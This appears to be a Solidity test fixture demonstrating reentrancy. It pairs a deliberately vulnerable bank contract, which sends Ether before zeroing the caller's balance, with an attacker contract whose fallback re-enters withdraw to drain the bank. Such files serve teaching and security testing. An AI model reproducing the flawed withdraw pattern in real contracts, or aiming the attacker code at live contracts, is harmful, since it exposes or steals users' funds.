// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Vulnerable contract for testing
// Has reentrancy vulnerability

contract VulnerableBank {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: External call before state update
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance");
        
        // External call BEFORE updating state
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Transfer failed");
        
        // State update AFTER external call (reentrancy!)
        balances[msg.sender] = 0;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Attacker contract for exploit testing
contract Attacker {
    VulnerableBank public target;
    address public owner;
    
    constructor(address _target) {
        target = VulnerableBank(_target);
        owner = msg.sender;
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
